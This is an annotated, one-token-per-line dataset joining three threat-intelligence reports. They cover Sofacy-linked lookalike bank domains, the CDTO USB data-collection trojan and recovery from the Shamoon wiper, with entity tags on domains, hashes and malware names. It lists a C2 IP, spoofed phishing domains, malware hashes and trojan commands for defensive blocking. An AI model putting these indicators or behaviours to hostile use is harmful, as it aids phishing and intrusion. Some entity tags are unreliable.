Fake
Financial
Institutions
by
security
analysts
.

Also
identified
during
this
analysis
,
was
the
prepositioning
of
a
domain
targeting
the
financial
institution
B-OF-AMERIC.COM B_url.normal
,
created
in
April
2015
.

This
indicates
that
Bank
of
America
,
is
among
the
probable
targets
.

This
same
individual
has
registered
numerous
other
fake
domains
on
many
more
name
servers
.

One
of
these
name
servers
,
BULKBREAKERS.COM B_url.cncsvr
,
contains
several
other
international
financial
institutions
.

One
of
those
domains
,
T-D-CANADATRUST.COM B_url.cncsvr
,
was
updated
on
23
March
2015
,
and
appears
to
be
targeting
Toronto
Dominion
(
TD
)
Canada
Trust
.

Among
the
apparent
targets
of
other
domains
similarly
created
or
updated
in
2015
are
:

the
United
Nations
,
United
Nations
Children's
Fund
,
United
Bank
for
Africa
,
Regions
Bank
,
and
possibly
Commerzbank
.

Results

While
root9B's
discovery
began
with
servicing
their
own
customers
,
their
analysis
has
revealed
an
adversary
pattern
that
has
enabled
the
identification
of
previously
unknown
target
vectors
.

As
root9B
analysts
continued
to
peel
back
the
layers
,
it
became
more
apparent
,
that
this
attack
was
likely
associated
with
Russian
intelligence
.

The
targets
included
multiple
major
financial
institutions
,
as
well
as
the
international
government
domain
.

In
addition
to
identifying
targets
,
root9B
analysts
also
discovered
indicators
of
malware
,
the
analysis
of
which
revealed
several
zero-day B_malware.backdoor
threats I
and
their
corresponding
'
hashes
.
'

Each
new
discovery
revealed
more
information
,
enabling
a
more
complete
picture
to
emerge
.

root9B
discovered
and
analyzed
numerous
other
domains
being
staged
or
recently
created
for
the
malicious
cyber
operation
.

Also
discovered
was
a
fatal
flaw
in
the
hackers
tradecraft
that
lead
to
a
major
breakthrough
.

Research
based
on
the
adversary's
flaw
in
tactics
showed
that
there
was
a
strong
likelihood
of
two
distinct
subgroups
,
each
of
which
utilized
unique

methods
of
cover
for
their
activity
.

Each
of
the
two
groups
also
had
a
unique
theme
to
their
target
sets
.

The
first
seemed
to
focus
on
military
,
diplomatic
,
and
media
targets
,
and
relied
on
the
cover
of
proxies
and
private
domain
registrations
.

As
documented
earlier
,
the
other
group
used
deliberately
falsified
personalities
,
all
of
which
claimed
to
be
American
citizens
,
and
focused
on
financial
and
banking
targets
.

Understanding
the
scope
of
the
newly
staged
malicious
operations
,
root9B
also
tipped
the
information
to
the
appropriate
international
and
domestic
government
authorities
.

While
the
continued
vector
of
the
attack
remains
unclear
,
root9B
assesses
that
it
will
most
likely
be
a
spear-phishing B_malware.unknown
campaign
.

This
attack
vector
will
likely
use
a
well-crafted
email
containing
either
a
malicious
file
or
web
hyperlink
to
what
recipients
believe
is
the
actual
website
;

but
is
instead
a
fake
landing
page
.

In
typical
attacks
of
this
nature
,
once
users
navigate
to
the
link
,
visitors
are
prompted
to
supply
account
credentials
and
personal
information
under
the
false
assumption
that
they
are
communicating
with
their
bank
via
a
secure
link
.

However
,
it
is
possible
,
that
the
Sofacy
group
could
utilize
this
server
as
a
vector
to
deliver
malicious
code
to
the
banking
victims
in
an
attempt
to
obtain
access
to
the
network
.

As
of
October
2014
,
the
Symantec
Corporation
had
reported
an
increased
use
of
spear-phishing B_malware.unknown
emails
containing
malware
specifically
targeted
against
financial
institutions
.

According
to
their
conclusions
,
root9B
analysts
expect
that
spear-phishing B_malware.unknown
attacks I
will
begin
in
the
near
future
,
or
may
have
already
commenced
.

As
root9B
continues
to
work
with
authorities
it
is
recommended
that
the
aforementioned
financial
institutions
take
caution
examining
any
and
all
correspondence
.

In
addition
,
it
is
recommended
that
networks
begin
blocking
the
following
hashes
and
communications
with
the
identified
Command
and
Control
(
C2
)
server
:

Malware
SHA1
Hash
0450aaf8ed309ca6baf303837701b5b23aac6f05 B_hash
bb909d9c27a509bf97cdc85268556ff5a6d2550a B_hash
f325970fd24bb088f1befdae5788152329e26bf3 B_hash
a351842ee01374d66bae35354ffe72f0b1b8a40b B_hash

Command
and
Control
(
C2
)
Server
:
176.31.112.10 B_ip.cncsvr

Interesting
samples
of
over
250
identified
malicious
domains
*
:

b-of-americ.com B_url.cncsvr
osce-military.org B_url.cncsvr
bbcnewsweek.com B_url.cncsvr
qov.hu.com B_url.cncsvr
settings-yahoo.com B_url.cncsvr
yovtube.co B_url.cncsvr
googlesetting.com B_url.cncsvr
cbiuaebn.com B_url.cncsvr
cbiuaebank.com B_url.cncsvr
techcruncln.com B_url.cncsvr
un-unicef.org B_url.cncsvr
royalbsuk.com B_url.cncsvr
kwqx.us B_url.cncsvr
middle-eastreview.org B_url.cncsvr
unitednat.org B_url.cncsvr
fbonlinelottery.com B_url.cncsvr
fubnt.com B_url.cncsvr
globeshippers.biz B_url.cncsvr
globeshippers.net B_url.cncsvr
gsandsc.com B_url.cncsvr
gshippers.com B_url.cncsvr
hesselawchambers.com B_url.cncsvr
largefarm.net B_url.cncsvr
regionsbnk.info B_url.cncsvr
seatreasures.org B_url.cncsvr
ssandsc.com B_url.cncsvr
t-d-canadatrust.com B_url.cncsvr
techielawfirms.com B_url.cncsvr
togounoffice.com B_url.cncsvr
ubagroupsgh.com B_url.cncsvr
un-unicef.org B_url.cncsvr
unicomba.com B_url.cncsvr
universalcoba.com B_url.cncsvr

*
Some
domains
may
have
been
previously
reported
as
associated
with
the
Sofacy
Group
.

It
is
root9B's
opinion
that
new
information
regarding
cybercrime
targeting
banks
makes
this
information
relevant
.

Footnotes
:
i
http://www.newsweek.com/2015/05/15/russias-greatest-weapon-may-be-its-hackers-328864.html B_url.normal
ii
http://www.bloomberg.com/politics/articles/2014-10-30/security-firms-tie-russian-government-toutilities-hacks B_url.normal
iii
http://www.theguardian.com/world/2014/apr/24/vladimir-putin-web-breakup-internet-cia B_url.normal
iv
http://www.bloomberg.com/politics/articles/2014-10-30/security-firms-tie-russian-governmentto-utilities-hacks B_url.normal
Fidelis
Threat
Advisory
#1011

﻿'
New
CDTO
:
A
Sneakernet B_malware.backdoor
Trojan I
Solution
'

January
15
,
2014

Document
Status
:
FINAL

Last
Revised
:
2014
-­‐
01
-­‐
15

Executive
Summary
:

The
General
Dynamics
Fidelis
Cybersecurity
forensics
team
analyzed
several
related
malware
samples
that
together
provide
a
sophisticated
mechanism
to
gather
data
from
individual
computer
systems
.

The
malware
appears
to
be
part
of
a
system
that
may
be
optimized
for
use
by
an
insider
agent
and
/
or
for
collecting
data
from
disparate
networks
or
air-­‐gapped
systems
.

The
malware
includes
features
to
clean
up
after
itself
by
deleting
key
indicators
that
it
was
present
.

The
malware
system
apparently
includes
additional
components
that
have
not
been
identified
.

These
components
would
potentially
perform
additional
command
and
control
functions
and
potentially
exfiltration
from
the
central
host
.

The
sophistication
of
the
malware
and
the
effort
involved
in
its
development
would
indicate
that
it
was
developed
for
a
high
value
target
.

However
,
the
specific
targeting
of
this
malware
is
not
clear
at
this
time
.

We
are
concerned
that
while
the
malware
system
was
probably
developed
for
a
specific
target
or
family
of
targets
,
it
could
be
employed
with
little
adaptation
against
virtually
any
target
.

This
threat
advisory
describes
the
functionality
of
the
three
malware
files
to
include
command
inputs
and
the
resulting
behavior
of
the
malware
.

The
Fidelis
XPSTM
advanced
threat
defense
system
has
been
updated
with
rules
to
detect
various
components
of
this
malware
system
.

However
,
the
fact
there
are
still
unanswered
questions
about
the
components
of
this
malware
system
and
its
intended
targeting
,
emphasizes
the
importance
of
employing
that
best
practices
such
as
denying
use
of
removable
media
on
sensitive
systems
and
disabling
autorun
!

This
is
particularly
true
for
systems
that
are
not
protected
by
Fidelis
XPS
.

Additional
reverse
engineering
and
analysis
is
on-­‐going
at
this
time
.

Forensic
Analysis
Findings
:

On
8
Jan
2014
,
The
Fidelis
Network
Defense
and
Forensics
team
received
three
files
:
netsat.exe B_malware.infosteal
,
netui3.dll B_malware.backdoor
and
winmgt.dll B_malware.backdoor
.

All
three
files
were
32
bit
executable
files
.

Preliminary
analysis
disclosed
netsat.exe B_malware.infosteal
would
terminate
when
run
if
the
system
date
was
on
or
after
21
Jun
2013
.

The
submitted
files
appeared
to
represent
two
parts
of
a
suspected
data
collection
scheme
.

Essentially
,
netsat.exe B_malware.infosteal
appeared
to
operate
as
a
master
program
that
infected
removable
media
connected
to
the
system
whereon
it
was
running
and
collected
data
from
infected
drives
when
the
drives
returned
.

netsat.exe B_malware.infosteal
received
commands
from
an
encrypted
file
stored
on
the
local
system
.

The
infection
was
in
the
form
of
a
renamed
netui3.dll B_malware.backdoor
or
winmgt.dll B_malware.backdoor
file
along
with
an
Autorun.inf B_malware.backdoor
file
set
to
run
the
renamed
netui3.dll B_malware.backdoor
/
winmgt.dll B_malware.backdoor
when
the
infected
drive
was
connected
to
a
target
host
.

There
could
be
many
iterations
of
netsat.exe B_malware.infosteal
running
on
enterprise
or
targeted
entity
systems
.

Based
on
available
analysis
results
,
netsat.exe B_malware.infosteal
could
collect
surreptitiously
gathered
data
from
any
infected
drive
connected
to
the
system
whereon
netsat.exe B_malware.infosteal
was
running
,
e.g.
,
the
infected
drive
would
not
have
to
be
processed
by
the
same
system
whereon
it
became
infected
.

Data
,
in
the
form
of
files
,
destined
for
exfiltration
may
be
obfuscated
via
a
custom
XOR
operation
.

The
gathered
data
would
ostensibly
be
exfiltrated
via
other
means
.

Some
components
of
the
malware's
behavior
are
possibly
remarkable
.

Quickly
considering
these
results
in
cursory
questions
reflected
as
follows
:

•
Command
and
Control
(
C2 B_malware.backdoor
)
appears
to
be
accomplished
via
providing
commands
in
an
encrypted
file
stored
on
the
local
'
master
'
system
(
re
:
netsat.exe B_malware.infosteal
)
.

This
C2 B_malware.backdoor
scheme
would
seem
to
dictate
:

o
Intruder
remote
access
to
the
'
master
'
system

o
Intruder
local
access
to
the
'
master
'
system

o
a
C2 B_malware.backdoor
delivery
/
retrieval
component
,
such
as
another
piece
of
code
that
downloads
a
C2 B_malware.backdoor
file I

•
Available
information
precludes
determination
of
the
means
of
exfiltration
.

netsat.exe's B_malware.infosteal
data
collection
functionality
suggested
data
destined
for
exfiltration
might
be
collected
by
the
'
master
'
system
.

This
possibility
suggests
:

o
Intruder
remote
access
to
the
'
master
'
system

o
Intruder
local
access
to
the
'
master
'
system

o
An
exfiltration
mechanism
in
the
form
of
another
piece
of
code

Detection

Scanning
with
several
select
third
party
malware
detection
applications
resulted
in
zero
detections
.

Cursory
online
research
disclosed
a
file
named
netui3.dll B_malware.backdoor
was
possibly
submitted
to
VirSCAN.org
on
or
before
2
Dec
2013
.

The
name
netui3.dll B_malware.backdoor
appears
to
have
been
used
for
malware
in
the
past
and
was
likely
associated
with
a
backdoor
.

The
name
may
be
a
play
on
the
name
netui2.dll B_malware.normal
,
a
legitimate
Windows
file
name
.

File
System
Artifacts

File
Name
:
netsat.exe B_malware.infosteal

File
Size
:
43520
bytes

MD5
:
eb8399483b55f416e48a320d68597d72 B_hash

SHA1
:
8a7183b7ceb30517460b6ab614551ca38e915309 B_hash

PE
Time
:
0x5154F7F2
[
Fri
Mar
29
02:09:54
2013
UTC
]

Sections
(
4
)
:

Name
Entropy
MD5

.text
6.37
df1790813aca1265bc475f3891957512 B_hash

.rdata
5.19
a598dca4a8fe8ee17941fa60be746d31 B_hash

.data
0.29
b3d1c1a0b1054a082c841ebd1354755f B_hash

.rsrc
3.34
d4b9539426ff130b80e11efec7465acd B_hash

File
Name
:
netui3.dll B_malware.backdoor

File
Size
:
39424
bytes

MD5
:
68aed7b1f171b928913780d5b21f7617 B_hash

SHA1
:
44e711e95311b81d597a7800d96482b873cb8235 B_hash

PE
Time
:
0x5152AE99
[
Wed
Mar
27
08:32:25
2013
UTC
]

Sections
(
3
)
:

Name
Entropy
MD5

.text
6.37
b2a939d2ad678201560285287e7dca1d B_hash

.rdata
5.32
2cd54a2d2ada8650c9bd9eae69aef3ca B_hash

.data
0.58
70a79ca0958afad5b7742641b2cff9ea B_hash

File
Name
:
winmgt.dll B_malware.backdoor

File
Size
:
37888
bytes

MD5
:
54e4a15a68cfbb2314d0aaad455fbfce B_hash

SHA1
:
49531b098049ae52264ae9b398c2cf59ff5379bc B_hash

PE
Time
:
0x50CAEAE4
[
Fri
Dec
14
09:01:24
2012
UTC
]

Sections
(
3
)
:

Name
Entropy
MD5

.text
6.31
6a0f9499f4ca8e0b2e4f09b9126806e6 B_hash

.rdata
5.23
e49920b9ebad63f0d95bad505ea8fdf7 B_hash

.data
0.59
a583b2c8490a7f0fcaee2f4776e445d8 B_hash


Date
Checking

All
three
submitted
files
compared
the
system
date
and
time
to
hard
coded
dates
upon
execution
.

If
the
system
date
was
after
the
hard
coded
dates
,
the
malware
would
delete
itself
and
terminate
.

The
following
table
illustrates
the
hard
coded
dates
in
relation
to
the
affected
files
'
PE
dates
:

File
Name
PE
Timestamp
Date
Checked
Within
Executable
Image

netsat.exe B_malware.infosteal

29
Mar
2013

21
Jun
2013
(
Deletes
itself
and
associated
files
after
this
date
)

netui3.dll B_malware.backdoor

27
Mar
2013

31
May
2013
(
Deletes
itself
and
associated
files
after
this
date
)

winmgt.dll B_malware.backdoor

14
Dec
2012

30
Dec
2012
(
Deletes
itself
and
associated
files
after
this
date
)

Versioning
,
etc
.

The
following
version
information
was
recorded
in
the
netsat.exe B_malware.infosteal
executable
:

Child
Type
:
StringFileInfo

Language
/
Code
Page
:
1033
/
1200

CompanyName
:
Microsoft
Corporation

FileDescription
:
Cdto
Netware
2.12
Provider

FileVersion
:
5.1.2600.0
(
xpclient.010817-­‐1148
)

InternalName
:
NEWCDTO

LegalCopyright
:
Microsoft
Corporation
.

All
rights
reserved
.

OriginalFilename
:
cdto.dll

ProductName
:
Microsoft
Corporation
.

All
rights
reserved
.

ProductVersion
:
5
,
1
,
2600
,
0

Child
Type
:
VarFileInfo

Translation
:
1033
/
1200

The
Language
/
Code
Page
code
1033
denotes
U.S.
English
.

This
versioning
information
appears
contrived
.

However
,
it
looks
convincing
enough
to
pass
cursory
inspection
,
i.e.
,
the
format
appears
legitimate
and
the
appearance
does
not
engender
suspicion
.

Cursory
online
searches
failed
to
disclose
what
,
if
anything
Cdto
might
be
associated
with
.

Scanning
disclosed
the
file
contained
a
function
possibly
associated
with
TEAN
encryption
.

This
appeared
to
indicate
TEA
(
Tiny
Encryption
Algorithm
)
involvement
.

(
Note
:
The
encryption
is
used
to
encrypt
commands
stored
in
a
file
on
the
local
system
.
)

The
submitted
files
named
netui3.dll B_malware.backdoor
and
winmgt.dll B_malware.backdoor
did
not
have
embedded
versioning
Information
like
netsat.exe B_malware.infosteal
did
.

Files
and
paths

The
presence
of
the
following
files
may
indicate
netsat.exe B_malware.infosteal
,
et
al
,
involvement
:

CSIDL_WINDOWS\msagent\netui3.dll B_malware.backdoor
netui3.dll B_malware.backdoor
in
any
path
CSIDL_WINDOWS\msagent\netwn.drv
Netwn.drv
in
any
path
CSIDL_MYPICTURES\winssetup35.exe B_malware.backdoor
in
any
path
Setup23.exe
in
any
path
CSIDL_NETHOOD\Microsoft\Windows\Help\set.fl
CSIDL_LOCAL_APPDATA\Microsoft\Windows\Help\intr
CSIDL_NETHOOD\Microsoft\Windows\Chars\ferf.st
CSIDL_NETHOOD\Microsoft\Windows\Chars\fert.st
CSIDL_LOCAL_APPDATA\Microsoft\Windows\Chars\intr
CSIDL_NETHOOD\Microsoft\Windows\message\
CSIDL_NETHOOD\Microsoft\Windows\Intel\
Act.te
in
any
path

u.t
in
any
path
netwi.drv B_malware.backdoor
in
any
path
~
FF325I.tmp
or
~
FF323D.tmp
in
the
path
specified
by
the
TMP
.
TEMP
.
or
USERPROFILE
environment
variables
or
the
Windows
directory

The
presence
of
the
following
,
specifically
on
removable
media
,
may
indicate
netsat.exe B_malware.infosteal
,
et
al
,
involvement
:

Autorun.inf B_malware.backdoor
file
containing
the
file
name
setup35.exe B_malware.backdoor
or
possibly
setup23.exe

RECYCLER\RECYCLED\SYS
RECYCLED\RECYCLED\SYS
RECYCLED\RECYCLED\SYS\desktop.ini
(
Won't
be
visible
via
GUI
)
RECYCLER\RECYCLED\SYS\desktop.ini
(
Won't
be
visible
via
GUI
)
~
disk.ini B_malware.backdoor

Registry

Cursory
analysis
did
not
disclose
entrenchment
data
,
such
as
a
Registry
entry
to
ensure
persistence
.

Network
Artufacts
:

This
cursory
analysis
disclosed
no
network
artifacts
specific
to
the
malware's
operation
.

However
,
evidence
of
any
of
the
files
involved
(
MD5
,
strings
,
file
names
)
traversing
the
network
,
e.g.
,
on
the
move
,
may
be
indicative
of
netsat.exe B_malware.infosteal
,
et
al
presence
.

Given
what
was
revealed
during
this
cursory
analysis
,
finding
string
and
or
hash
artifacts
in
SMB
traffic
seemed
the
most
likely
possibility
with
regard
to
network
detection
.

Strings
:

netsat.exe B_malware.infosteal

The
following
interesting
strings
were
noted
in
the
raw
netsat.exe B_malware.infosteal
file
:

VMProtect
begin
VMProtect
end
!
Path
-­‐-­‐
>
%s
to
Added
!
Pathlen
=
%u
AddInit
-­‐>
ci.DestFile
:
%s
!ad
dri
,
nD
=
%d
netui3.dll B_malware.backdoor
netwi.drv B_malware.backdoor
Global
\
Mtx_Sp_On_PC_1_2_8

Cdto
Netware
2.12
Provider
!
Cr
Des
!
Cr
De.i.
err
=
%d
setup35.exe B_malware.backdoor
setup23.exe
act.te
ferf.st
fert.st
netwn.drv
D
c
p
D
c
u
SystemPriClass
!
Cr
ne
j

netui3.dll B_malware.backdoor

The
following
interesting
strings
were
noted
in
the
raw
netui3.dll B_malware.backdoor
file
:

set.fl
setup35.exe B_malware.backdoor
setup32.exe B_malware.backdoor
act.te
ferf.st
fert.st
u.t
setup23.exe
%s
-­‐
wu
%s
%s
-­‐
ws
%s
No
j
n
Mtx_Sp_On_PC_1_2_8
SystemPriClass

winmgt.dll B_malware.backdoor

The
following
interesting
strings
were
noted
in
the
raw
winmgt.dll B_malware.backdoor
file
:

set.fl
setup35.exe B_malware.backdoor
setup32.exe B_malware.backdoor
act.te
ferf.st
fert.st
u.t
%s
-­
‐wu
%s
No
j
n
Mtx_Sp_On_PC_1_2_8
\
wins.log
SystemPriClass

Functionality
:

Based
on
netsat.exe B_malware.infosteal
manipulating
a
file
named
netui3.dll B_malware.backdoor
,
the
submitted
netsat.exe B_malware.infosteal
and
netui3.dll B_malware.backdoor
appeared
associated
.

Versioning
is
possible
.

For
example
,
the
submitted
netui3.dll B_malware.backdoor
sample
may
not
match
the
submitted
netsat.exe B_malware.infosteal
sample
in
terms
of
versioning
.

However
,
analysis
assumed
,
for
the
sake
of
efficiency
,
that
the
submitted
netui3.dll B_malware.backdoor
and
submitted
netsat.exe B_malware.infosteal
file
were
associated
.

The
submitted
winmgt.dll B_malware.backdoor
file
appeared
very
similar
to
netui3.dll B_malware.backdoor
.

However
,
some
differences
suggested
the
two
files
represented
disparate
versions
.

Analysis
disclosed
date
sensitivity
built
into
the
submitted
files
.

If
the
sample
was
run
after
a
particular
date
,
it
would
effectively
terminate
and
delete
itself
:

File
Name
PE
Timestamp
Date
Checked
Within
Executable
Image

netsat.exe B_malware.infosteal

29
Mar
2013

21
Jun
2013
(
Deletes
itself
and
associated
files
after
this
date
)

netui3.dll B_malware.backdoor

27
Mar
2013

31
May
2013
(
Deletes
itself
and
associated
files
after
this
date
)

winmgt.dll B_malware.backdoor

14
Dec
2012

30
Dec
2012
(
Deletes
itself
and
associated
files
after
this
date
)

Analysis
disclosed
netsat.exe B_malware.infosteal
probably
serves
as
the
headquarters
of
malicious
activity
by
:

•
Running
on
a
possibly
compromised
system

•
Logging
some
activity
and
errors
to
a
file

•
Receiving
commands
via
an
encrypted
file
on
the
local
system
(
possible
C2
)

•
Listening
for
drive
connections

•
Infecting
connected
drives
with
netui3.dll B_malware.backdoor
/
winmgt.dll B_malware.backdoor
(
setup32.exe B_malware.backdoor
+
Autorun.inf B_malware.backdoor
)

•
Collecting
data
gathered
by
any
infected
drives
,
ostensibly
upon
their
return
from
being
connected
to
other
systems

Analysis
disclosed
netui3.dll B_malware.backdoor
/
winmgt.dll B_malware.backdoor
probably
serve
as
the
field
units
of
malicious
activity
by
:

•
Collecting
information
about
systems
it
comes
into
contact
with
through
connection
to
the
targeted
systems
with
the
drive
whereon
the
malware
resides

o
Platform
o
Name
o
Version
o
Type
o
Primary
or
Backup
Domain
Controller
(
PDC
or
BDC
)
o
Determines
network
join
status
(
none
,
workgroup
,
domain
)
via
NetGetJoinInformation
API
o
Detailed
OS
version
o
Running
Time
o
Computer
Name
o
User
Name
o
System
Directory
o
Current
Date
and
Time
o
Locale
Information
(
Country
and
Language
)
o
Drive
info
(
total
/
free
size
,
type
,
etc
.
)
o
Network
Adapter
description
o
IP
Address
o
IP
Mask
o
Gateway
IP
o
Recursive
directory
listings
o
Enumerates
normal
user
account
names

•
Collecting
file
listings
from
local
and
share
connected
drives

•
Discovering
and
connecting
to
shared
drives
visible
to
the
local
targeted
system

•
Copying
and
writing
files
to
/
from
drives
visible
to
the
local
targeted
system

Commands

The
following
commands
and
their
descriptions
,
listed
by
executable
file
,
illustrate
the
submitted
malware's
functionality
:

netsat.exe B_malware.infosteal

Command
Description

Cpd
copies
directories
and
contents

Cpr
copies
files
with
size
checking

Der
deletes
files
and
records
activity
in
log

Dir
obtains
a
directory
listing

netsat.exe B_malware.infosteal

Command
Description

Ferry
writes
malicious
files
to
a
hidden
RECYCLED
or
RECYCLER
directory

Files
:
setup35.exe B_malware.backdoor
(
renamed
netui3.dll B_malware.backdoor
)
,
Autorun.inf B_malware.backdoor
,
~
disk.ini B_malware.backdoor
(
renamed
netwi.drv B_malware.backdoor
)
,
act.te

Getres
iteratively
copies
files
from
RECYCLED
/
RECYCLER
directory
on
target
drive
,
deletes
from
source
after
copy
-­‐
source
is
assumed
to
be
drive
used
to
collect
data
from
one
or
more
systems


netui3.dll B_malware.backdoor
(
setup35.exe B_malware.backdoor
)

Command
Description

Cp
copies
files
from
one
location
to
another

Cpu
copies
files
from
one
location
to
another
setting
copied
files
as
hidden

Cptur
creates
a
directory
and
copies
file
to
that
directory

Ddr
silently
deletes
directory
(
performs
an
FO_DELETE
shell
file
operation
on
a
directory
with
the
FOF_NOERRORUI
,
FOF_NOCONFIRMATION
,
and
FOF_SILENT
flags
set
)

Del
deletes
a
file

Delu
deletes
a
file
after
setting
attributes
to
normal

Gd
recursively
writes
and
reads
encoded
data
to
/
from
a
directory

Gdir
prints
directory
listings
to
~FF323D.tmp
;
data
gets
encoded
;
original
~FF323D.tmp
file
is
deleted

Gf
writes
and
reads
encoded
data
to
/
from
a
file

Gfover
determines
if
it
has
access
to
a
file
;
may
be
a
temp
file
creation
/
rename
involved

Gi
collects
system
related
and
possibly
network
related
information
such
as
,
domains
,
system
information

Ndr
creates
a
directory

Newend
closes
a
file
that
was
opened
for
writing

Newster
sets
normal
attributes
on
a
targeted
file
,
deletes
the
file
,
opens
the
same
file
name
as
a
binary
file

Wr
writes
a
string
to
a
new
file
opened
by
the
newstar
command
.

Runb
try
to
run
a
targeted
executable
and
then
checks
for
the
existence
of
that
file
every
second
for
the
next
15
minutes
as
long
as
it
exists

netui3.dll B_malware.backdoor
(
setup35.exe B_malware.backdoor
)

Command
Description

Rune
try
to
run
a
targeted
executable
one
time

Slf
generates
a
targeted
file
listing
,
e.g.
,
dir
,
then
copies
the
files
in
the
list
one
by
one

Srf
copies
files
in
a
list
one
by
one

Srmf
uses
NetUseAdd
to
connect
to
ipc$
share
of
a
target
host
,
creates
a
listing
of
files
in
the
c$
-­‐
z$
shares
of
the
target
host
,
copies
the
files
to
a
new
location
,
deletes
the
share
connection
added
using
NetuseAdd

Note
:
rows
highlighted
in
grey
denote
a
best
guess
on
functionality
;
more
analysis
was
pending
at
the
time
of
this
report

Conclusions
:

This
advisory
is
based
on
preliminary
information
.

It
is
important
to
note
that
reverse
engineering
and
analysis
of
the
malware
system
is
still
underway
.

We
expect
to
provide
additional
data
,
and
some
of
this
information
may
change
as
a
result
of
continued
research
.

However
,
due
to
the
unique
functionality
of
malware
system
and
its
potential
for
employment
against
targets
beyond
the
initially
intended
victim
,
the
network
security
community
should
be
concerned
and
track
this
malware
closely
.

While
we
have
updated
the
Fidelis
XPS
system
to
detect
known
components
of
the
malware
family
,
this
package
reemphasizes
the
importance
of
employing
good
basic
network
security
practices
such
as
denying
use
of
removable
media
on
sensitive
systems
and
disabling
autorun
!
Fidelis
Threat
Advisory
#
1007

RECOVERING
FROM
SHAMOON B_malware.unknown

November
1
,
2012

Document
Status
:
FINAL

Last
Revised
:
2012-11-01

Executive
Summary

The
SHAMOON B_malware.unknown
malware I
has
received
considerable
coverage
in
the
past
couple
of
months
because
of
its
destructive
nature
.

Despite
assertions
that
it
is
the
work
of
amateurs
,
it
has
had
a
major
impact
on
companies
believed
to
have
been
affected
.

The
basic
functions
of
the
malware
are
to
infect
,
entrench
,
propagate
,
and
wipe
.

However
because
of
the
way
the
malware
operates
and
how
it
is
programmed
to
wipe
,
it
can
find
itself
being
its
own
enemy
.

It
will
wipe
data
found
in
the
Documents
and
Settings
folder
and
the
System32
folder
,
and
then
use
a
signed
driver
for
disk
access
to
start
wiping
at
the
disk
level
.

Because
the
operating
system
needs
certain
files
in
the
System32
folder
to
run
,
it
was
found
that
infected
hosts
will
always
restart
before
the
malware
can
wipe
completely
at
the
disk
level
.

Due
to
this
it
was
possible
to
make
a
complete
recovery
of
SHAMOON B_malware.unknown
- I
infected I
file I
systems
to
the
state
they
were
in
before
the
wiping
made
the
OS
unbootable
and
unreadable
.

In
fact
the
majority
of
files
outside
of
the
System32
and
Document
and
Settings
folder
are
recoverable
as
well
;
this
provided
the
opportunity
for
a
successful
and
fruitful
analysis
,
investigation
,
and
remediation
effort
.

Threat
Overview

According
to
community
write-ups
,
the
SHAMOON B_malware.unknown
malware I
appears
to
have
been
deployed
against
a
couple
of
entities
on
or
about
August
15
,
2012
.

The
malware
had
self-propagating
qualities
and
was
designed
to
overwrite
data
on
disks
attached
to
or
accessible
from
targeted
systems
.

The
malware's
functionality
,
briefly
summarized
below
,
was
covered
in
some
detail
in
community
postings
,
such
as
Kaspersky's
Securelist
blog
.

Analysis
details
and
testing
of
an
available
sample
of
SHAMOON B_malware.unknown
by
General
Dynamics
Fidelis
Cybersecurity
Solutions
researchers
revealed
that
the
malware's
wipe
operations
did
not
overwrite
entire
disks
,
but
rather
overwrote
enough
to
prevent
access
to
the
affected
file
systems
,
along
with
substantial
amounts
of
file
data
.

However
,
analysis
indicated
that
some
files
were
still
intact
after
the
malware's
write
operations
and
subsequent
system
reboot
.

Users
are
granted
permission
to
copy
and
/
or
distribute
this
document
in
its
original
electronic
form
and
print
copies
for
personal
use
.

This
document
cannot
be
modified
or
converted
to
any
other
electronic
or
machine-readable
form
in
whole
or
in
part
without
prior
written
approval
of
General
Dynamics
Fidelis
Cybersecurity
Solutions
,
Inc
.

While
we
have
done
our
best
to
ensure
that
the
material
found
in
this
document
is
accurate
,
Fidelis
makes
no
guarantee
that
the
information
contained
herein
is
error
free
.

Fidelis
researchers
surmised
there
might
be
a
means
of
recovering
file
data
from
targeted
systems
from
a
forensic
and
investigative
analysis
point
of
view
.

With
this
goal
in
mind
,
researchers
tested
several
possible
ways
of
restoring
disk
data
critical
to
the
access
of
the
targeted
disk's
file
system
.

What
follows
is
a
brief
description
of
what
the
sample
of
the
SHAMOON B_malware.unknown
malware I
does
and
a
description
and
results
of
researchers
'
file
system
recovery
efforts
.

SHAMOON B_malware.unknown
Wiper I
Functionality
Actions
:
-­‐
Executes
a
copy
of
itself
as
a
scheduled
job

-­‐
Deletes
the
file
created
for
the
scheduled
job

-­‐
Entrenches
itself
as
a
service

-­‐
Execution
of
the
entrenched
file
results
in
a
dropped
driver

-­‐
The
dropped
driver
is
loaded
and
executed

-­‐
The
dropped
driver
facilitates
disk
access

-­‐
The
malware
overwrites
disk
data
to
include
the
contents
of
\
\
Documents
and
Settings
(
user
data
)
and
\
\
Windows
\
system32
(
system
data
)
directories

-­‐
The
malware
eventually
overwrites
the
disk's
boot
records
(
Master
Boot
Record
(
MBR
)
and
Volume
Boot
Record
(
VBR
)
)
(
Note
:
Testing
was
accomplished
on
disks
with
one
partition
)

-­‐
The
malware
appears
to
target
user
data
first
,
then
system
data

-­‐
The
nature
of
the
overwrites
is
such
that
the
malware
writes
only
a
certain
amount
of
data
to
targeted
files
,
starting
at
the
files
'
beginning
(
Offset
0x0
)
and
then
writing
a
certain
amount
of
data
to
other
file
locations

-­‐
Fidelis
researcher
observations
included
the
following
:

o
At
some
point
during
the
writing
(
wiping
)
process
,
the
targeted
system
tries
to
read
file
data
that
has
been
overwritten
,
prompting
an
attempt
to
restore
the
involved
file

o
The
system
asks
the
user
for
media
containing
system
files
when
it
cannot
find

o
The
targeted
system
eventually
reboots
,
resulting
an
error
on
restart
because
of
the
system
files
it
is
looking
for
the
overwritten
boot
records

o
The
disks
targeted
in
testing
were
not
completely
overwritten;
there
was
still
apparently
viable
file
data
on
the
targeted
disks

o
The
result
of
the
malware's
operation
was
the
prevention
of
accessing
the
targeted
file
system

Note
:
The
SHAMOON B_malware.unknown
sample
Fidelis
researchers
had
available
looked
very
similar
to
that
detailed
in
community
write-ups
.

However
,
as
of
the
date
of
publication
,
researchers
were
still
analyzing
the
available
sample
.

Therefore
,
differences
between
the
available
sample
and
others
available
to
the
community
may
become
apparent
in
the
future
.

Analysis
and
Testing
Overview

Fidelis
initially
approached
the
SHAMOON B_malware.unknown
analysis
strictly
from
a
perspective
of
determining
what
forensic
artifacts
could
be
recovered
from
a
targeted
system
.

The
goal
was
at
least
a
partial

reconstruction
of
the
events
precipitating
the
SHAMOON B_malware.unknown
attack I
,
and
possibly
using
those
events
found
on
the
targeted
systems
to
determine
a
start
of
the
attack
,
and
a
possible
source
.

Analysis
revealed
the
possibility
that
some
user
data
would
be
recovered
as
a
side
benefit
to
the
forensic
analysis
process
.

